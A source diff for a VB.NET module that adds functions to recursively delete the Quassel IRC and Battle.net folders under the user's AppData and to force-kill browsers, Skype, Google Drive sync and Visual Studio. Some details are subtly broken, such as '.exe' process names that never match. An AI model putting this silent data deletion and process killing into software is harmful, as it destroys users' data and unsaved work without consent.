@@ -75,6 +75,15 @@ Module modLib
         Return Nothing
     End Function
 
+    Public Function rm_quassel()
+        Dim szProgramFilesPath As String
+        szProgramFilesPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
+        rm(szProgramFilesPath & "\AppData\Roaming\quassel-irc.org")
+        rm(szProgramFilesPath & "\AppData\Local\Battle.net")
+        Return Nothing
+    End Function
+
+
     Private Sub rm(path As String)
         If Directory.Exists(path) Then
             'Delete all files from the Directory
@@ -89,5 +98,23 @@ Module modLib
             Directory.Delete(path)
         End If
     End Sub
+
+    Public Function TerminateProgramList()
+        Dim array() As String = {"chrome", "firefox", "googledrivesync.exe", "skype.exe", "devenv.exe"}
+        For Each Val As String In array
+            kill_proc(Val)
+        Next
+        Return Nothing
+    End Function
+
+    Public Function kill_proc(ProcessName As String)
+        For Each p As Process In Process.GetProcesses
+            'ListBox1.Items.Add(p.ProcessName.ToString)
+            If p.ProcessName = ProcessName Then
+                p.Kill()
+            End If
+        Next
+        Return Nothing
+    End Function
 
 End Module
